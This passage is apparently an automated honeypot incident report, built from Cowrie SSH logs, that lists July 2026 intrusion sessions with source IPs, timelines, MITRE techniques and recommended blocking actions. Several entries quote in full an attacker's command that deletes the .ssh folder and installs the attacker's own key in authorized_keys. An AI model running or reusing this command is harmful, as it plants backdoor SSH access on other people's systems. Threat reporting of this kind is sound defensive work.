|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 04:00 |
| **Last Seen** | 2026-07-03 04:00 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:00:36` | `cowrie.session.connect` |
| `2026-07-03 04:00:38` | `cowrie.client.version` |
| `2026-07-03 04:00:38` | `cowrie.client.kex` |
| `2026-07-03 04:00:44` | `cowrie.login.success` |
| `2026-07-03 04:00:48` | `cowrie.session.params` |
| `2026-07-03 04:00:48` | `cowrie.command.input` |
| `2026-07-03 04:00:49` | `cowrie.log.closed` |
| `2026-07-03 04:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2edb77a4a01f

| Field | Detail |
|---|---|
| **Source IP** | `134.122.102[.]174` |
| **First Seen** | 2026-07-03 04:02 |
| **Last Seen** | 2026-07-03 04:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:02:57` | `cowrie.session.connect` |
| `2026-07-03 04:02:58` | `cowrie.client.version` |
| `2026-07-03 04:02:58` | `cowrie.client.kex` |
| `2026-07-03 04:03:00` | `cowrie.login.success` |
| `2026-07-03 04:03:01` | `cowrie.session.params` |
| `2026-07-03 04:03:01` | `cowrie.command.input` |
| `2026-07-03 04:03:01` | `cowrie.log.closed` |
| `2026-07-03 04:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.102[.]174` to AbuseIPDB if not already reported
- [ ] Block `134.122.102[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6bb2d67e7b7

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-03 04:04 |
| **Last Seen** | 2026-07-03 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:04:48` | `cowrie.session.connect` |
| `2026-07-03 04:04:48` | `cowrie.client.version` |
| `2026-07-03 04:04:48` | `cowrie.client.kex` |
| `2026-07-03 04:04:49` | `cowrie.login.success` |
| `2026-07-03 04:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc8671e48747

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-03 04:04 |
| **Last Seen** | 2026-07-03 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:04:48` | `cowrie.session.connect` |
| `2026-07-03 04:04:48` | `cowrie.client.version` |
| `2026-07-03 04:04:48` | `cowrie.client.kex` |
| `2026-07-03 04:04:49` | `cowrie.login.success` |
| `2026-07-03 04:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30457c25b4a0

| Field | Detail |
|---|---|
| **Source IP** | `134.122.102[.]174` |
| **First Seen** | 2026-07-03 04:06 |
| **Last Seen** | 2026-07-03 04:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:06:02` | `cowrie.session.connect` |
| `2026-07-03 04:06:02` | `cowrie.client.version` |
| `2026-07-03 04:06:02` | `cowrie.client.kex` |
| `2026-07-03 04:06:04` | `cowrie.login.success` |
| `2026-07-03 04:06:05` | `cowrie.session.params` |
| `2026-07-03 04:06:05` | `cowrie.command.input` |
| `2026-07-03 04:06:05` | `cowrie.log.closed` |
| `2026-07-03 04:06:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.102[.]174` to AbuseIPDB if not already reported
- [ ] Block `134.122.102[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfcc0d826118

| Field | Detail |
|---|---|
| **Source IP** | `134.122.102[.]174` |
| **First Seen** | 2026-07-03 04:08 |
| **Last Seen** | 2026-07-03 04:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:08:58` | `cowrie.session.connect` |
| `2026-07-03 04:08:59` | `cowrie.client.version` |
| `2026-07-03 04:08:59` | `cowrie.client.kex` |
| `2026-07-03 04:09:00` | `cowrie.login.success` |
| `2026-07-03 04:09:02` | `cowrie.session.params` |
| `2026-07-03 04:09:02` | `cowrie.command.input` |
| `2026-07-03 04:09:02` | `cowrie.log.closed` |
| `2026-07-03 04:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.102[.]174` to AbuseIPDB if not already reported
- [ ] Block `134.122.102[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6b109c064d8

| Field | Detail |
|---|---|
| **Source IP** | `115.190.203[.]239` |
| **First Seen** | 2026-07-03 04:09 |
| **Last Seen** | 2026-07-03 04:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:09:58` | `cowrie.session.connect` |
| `2026-07-03 04:09:58` | `cowrie.client.version` |
| `2026-07-03 04:09:58` | `cowrie.client.kex` |
| `2026-07-03 04:09:59` | `cowrie.login.success` |
| `2026-07-03 04:10:00` | `cowrie.session.params` |
| `2026-07-03 04:10:00` | `cowrie.command.input` |
| `2026-07-03 04:10:00` | `cowrie.command.failed` |
| `2026-07-03 04:10:00` | `cowrie.log.closed` |
| `2026-07-03 04:10:01` | `cowrie.session.params` |
| `2026-07-03 04:10:01` | `cowrie.command.input` |
| `2026-07-03 04:10:01` | `cowrie.session.file_download` |
| `2026-07-03 04:10:01` | `cowrie.log.closed` |
| `2026-07-03 04:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.203[.]239` to AbuseIPDB if not already reported
- [ ] Block `115.190.203[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aafbedf499f5

| Field | Detail |
|---|---|
| **Source IP** | `115.190.203[.]239` |
| **First Seen** | 2026-07-03 04:10 |
| **Last Seen** | 2026-07-03 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:10:02` | `cowrie.session.connect` |
| `2026-07-03 04:10:03` | `cowrie.client.version` |
| `2026-07-03 04:10:03` | `cowrie.client.kex` |
| `2026-07-03 04:10:04` | `cowrie.login.success` |
| `2026-07-03 04:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.203[.]239` to AbuseIPDB if not already reported
- [ ] Block `115.190.203[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82dc3dabd8e8

| Field | Detail |
|---|---|
| **Source IP** | `115.190.203[.]239` |
| **First Seen** | 2026-07-03 04:10 |
| **Last Seen** | 2026-07-03 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:10:04` | `cowrie.session.connect` |
| `2026-07-03 04:10:04` | `cowrie.client.version` |
| `2026-07-03 04:10:04` | `cowrie.client.kex` |
| `2026-07-03 04:10:05` | `cowrie.login.success` |
| `2026-07-03 04:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.203[.]239` to AbuseIPDB if not already reported
- [ ] Block `115.190.203[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97c81a5fcc96

| Field | Detail |
|---|---|
| **Source IP** | `134.122.102[.]174` |
| **First Seen** | 2026-07-03 04:11 |
| **Last Seen** | 2026-07-03 04:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:11:47` | `cowrie.session.connect` |
| `2026-07-03 04:11:48` | `cowrie.client.version` |
| `2026-07-03 04:11:48` | `cowrie.client.kex` |
| `2026-07-03 04:11:49` | `cowrie.login.success` |
| `2026-07-03 04:11:51` | `cowrie.session.params` |
| `2026-07-03 04:11:51` | `cowrie.command.input` |
| `2026-07-03 04:11:51` | `cowrie.log.closed` |
| `2026-07-03 04:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.102[.]174` to AbuseIPDB if not already reported
- [ ] Block `134.122.102[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27d82c2894f1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 04:12 |
| **Last Seen** | 2026-07-03 04:12 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:12:05` | `cowrie.session.connect` |
| `2026-07-03 04:12:06` | `cowrie.client.version` |
| `2026-07-03 04:12:06` | `cowrie.client.kex` |
| `2026-07-03 04:12:14` | `cowrie.login.success` |
| `2026-07-03 04:12:18` | `cowrie.session.params` |
| `2026-07-03 04:12:18` | `cowrie.command.input` |
| `2026-07-03 04:12:20` | `cowrie.log.closed` |
| `2026-07-03 04:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78410659a7d5

| Field | Detail |
|---|---|
| **Source IP** | `124.193.81[.]23` |
| **First Seen** | 2026-07-03 04:14 |
| **Last Seen** | 2026-07-03 04:19 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:14:16` | `cowrie.session.connect` |
| `2026-07-03 04:14:17` | `cowrie.client.version` |
| `2026-07-03 04:14:17` | `cowrie.client.kex` |
| `2026-07-03 04:14:18` | `cowrie.login.success` |
| `2026-07-03 04:14:19` | `cowrie.session.params` |
| `2026-07-03 04:14:19` | `cowrie.command.input` |
| `2026-07-03 04:14:19` | `cowrie.command.failed` |
| `2026-07-03 04:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.193.81[.]23` to AbuseIPDB if not already reported
- [ ] Block `124.193.81[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be5859376a46

| Field | Detail |
|---|---|
| **Source IP** | `58.186.20[.]143` |
| **First Seen** | 2026-07-03 04:14 |
| **Last Seen** | 2026-07-03 04:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:14:34` | `cowrie.session.connect` |
| `2026-07-03 04:14:34` | `cowrie.client.version` |
| `2026-07-03 04:14:34` | `cowrie.client.kex` |
| `2026-07-03 04:14:35` | `cowrie.login.success` |
| `2026-07-03 04:14:36` | `cowrie.session.params` |
| `2026-07-03 04:14:36` | `cowrie.command.input` |
| `2026-07-03 04:14:36` | `cowrie.command.failed` |
| `2026-07-03 04:14:36` | `cowrie.log.closed` |
| `2026-07-03 04:14:37` | `cowrie.session.params` |
| `2026-07-03 04:14:37` | `cowrie.command.input` |
| `2026-07-03 04:14:37` | `cowrie.session.file_download` |
| `2026-07-03 04:14:37` | `cowrie.log.closed` |
| `2026-07-03 04:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.186.20[.]143` to AbuseIPDB if not already reported
- [ ] Block `58.186.20[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dea0d5829b32

| Field | Detail |
|---|---|
| **Source IP** | `124.193.81[.]23` |
| **First Seen** | 2026-07-03 04:14 |
| **Last Seen** | 2026-07-03 04:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:14:34` | `cowrie.session.connect` |
| `2026-07-03 04:14:34` | `cowrie.client.version` |
| `2026-07-03 04:14:34` | `cowrie.client.kex` |
| `2026-07-03 04:14:35` | `cowrie.login.success` |
| `2026-07-03 04:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.193.81[.]23` to AbuseIPDB if not already reported
- [ ] Block `124.193.81[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65c9ba1ba89a

| Field | Detail |
|---|---|
| **Source IP** | `58.186.20[.]143` |
| **First Seen** | 2026-07-03 04:14 |
| **Last Seen** | 2026-07-03 04:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:14:38` | `cowrie.session.connect` |
| `2026-07-03 04:14:38` | `cowrie.client.version` |
| `2026-07-03 04:14:38` | `cowrie.client.kex` |
| `2026-07-03 04:14:39` | `cowrie.login.success` |
| `2026-07-03 04:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.186.20[.]143` to AbuseIPDB if not already reported
- [ ] Block `58.186.20[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7342f3539a14

| Field | Detail |
|---|---|
| **Source IP** | `58.186.20[.]143` |
| **First Seen** | 2026-07-03 04:14 |
| **Last Seen** | 2026-07-03 04:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:14:39` | `cowrie.session.connect` |
| `2026-07-03 04:14:39` | `cowrie.client.version` |
| `2026-07-03 04:14:40` | `cowrie.client.kex` |
| `2026-07-03 04:14:41` | `cowrie.login.success` |
| `2026-07-03 04:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.186.20[.]143` to AbuseIPDB if not already reported
- [ ] Block `58.186.20[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-437a7d9ccbd9

| Field | Detail |
|---|---|
| **Source IP** | `138.99.80[.]102` |
| **First Seen** | 2026-07-03 04:19 |
| **Last Seen** | 2026-07-03 04:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:19:06` | `cowrie.session.connect` |
| `2026-07-03 04:19:06` | `cowrie.client.version` |
| `2026-07-03 04:19:06` | `cowrie.client.kex` |
| `2026-07-03 04:19:06` | `cowrie.login.success` |
| `2026-07-03 04:19:07` | `cowrie.session.params` |
| `2026-07-03 04:19:07` | `cowrie.command.input` |
| `2026-07-03 04:19:07` | `cowrie.command.failed` |
| `2026-07-03 04:19:07` | `cowrie.log.closed` |
| `2026-07-03 04:19:08` | `cowrie.session.params` |
| `2026-07-03 04:19:08` | `cowrie.command.input` |
| `2026-07-03 04:19:08` | `cowrie.session.file_download` |
| `2026-07-03 04:19:08` | `cowrie.log.closed` |
| `2026-07-03 04:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.99.80[.]102` to AbuseIPDB if not already reported
- [ ] Block `138.99.80[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-922f157b33a1

| Field | Detail |
|---|---|
| **Source IP** | `138.99.80[.]102` |
| **First Seen** | 2026-07-03 04:19 |
| **Last Seen** | 2026-07-03 04:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:19:08` | `cowrie.session.connect` |
| `2026-07-03 04:19:08` | `cowrie.client.version` |
| `2026-07-03 04:19:08` | `cowrie.client.kex` |
| `2026-07-03 04:19:09` | `cowrie.login.success` |
| `2026-07-03 04:19:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.99.80[.]102` to AbuseIPDB if not already reported
- [ ] Block `138.99.80[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8acc17858ae2

| Field | Detail |
|---|---|
| **Source IP** | `138.99.80[.]102` |
| **First Seen** | 2026-07-03 04:19 |
| **Last Seen** | 2026-07-03 04:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:19:09` | `cowrie.session.connect` |
| `2026-07-03 04:19:09` | `cowrie.client.version` |
| `2026-07-03 04:19:09` | `cowrie.client.kex` |
| `2026-07-03 04:19:10` | `cowrie.login.success` |
| `2026-07-03 04:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.99.80[.]102` to AbuseIPDB if not already reported
- [ ] Block `138.99.80[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5525b3d49ef

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 04:23 |
| **Last Seen** | 2026-07-03 04:23 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:23:31` | `cowrie.session.connect` |
| `2026-07-03 04:23:32` | `cowrie.client.version` |
| `2026-07-03 04:23:32` | `cowrie.client.kex` |
| `2026-07-03 04:23:38` | `cowrie.login.success` |
| `2026-07-03 04:23:41` | `cowrie.session.params` |
| `2026-07-03 04:23:41` | `cowrie.command.input` |
| `2026-07-03 04:23:44` | `cowrie.log.closed` |
| `2026-07-03 04:23:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7624248097ca

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-03 04:28 |
| **Last Seen** | 2026-07-03 04:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:28:07` | `cowrie.session.connect` |
| `2026-07-03 04:28:07` | `cowrie.client.version` |
| `2026-07-03 04:28:07` | `cowrie.client.kex` |
| `2026-07-03 04:28:07` | `cowrie.login.success` |
| `2026-07-03 04:28:07` | `cowrie.direct-tcpip.request` |
| `2026-07-03 04:28:08` | `cowrie.direct-tcpip.data` |
| `2026-07-03 04:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52bb254040c8

| Field | Detail |
|---|---|
| **Source IP** | `101.53.236[.]155` |
| **First Seen** | 2026-07-03 04:31 |
| **Last Seen** | 2026-07-03 04:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:31:26` | `cowrie.session.connect` |
| `2026-07-03 04:31:26` | `cowrie.client.version` |
| `2026-07-03 04:31:27` | `cowrie.client.kex` |
| `2026-07-03 04:31:27` | `cowrie.login.success` |
| `2026-07-03 04:31:28` | `cowrie.session.params` |
| `2026-07-03 04:31:28` | `cowrie.command.input` |
| `2026-07-03 04:31:28` | `cowrie.command.failed` |
| `2026-07-03 04:31:29` | `cowrie.log.closed` |
| `2026-07-03 04:31:30` | `cowrie.session.params` |
| `2026-07-03 04:31:30` | `cowrie.command.input` |
| `2026-07-03 04:31:30` | `cowrie.session.file_download` |
| `2026-07-03 04:31:30` | `cowrie.log.closed` |
| `2026-07-03 04:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.53.236[.]155` to AbuseIPDB if not already reported
- [ ] Block `101.53.236[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2de2f75a94c

| Field | Detail |
|---|---|
| **Source IP** | `101.53.236[.]155` |
| **First Seen** | 2026-07-03 04:31 |
| **Last Seen** | 2026-07-03 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:31:30` | `cowrie.session.connect` |
| `2026-07-03 04:31:30` | `cowrie.client.version` |
| `2026-07-03 04:31:30` | `cowrie.client.kex` |
| `2026-07-03 04:31:31` | `cowrie.login.success` |
| `2026-07-03 04:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
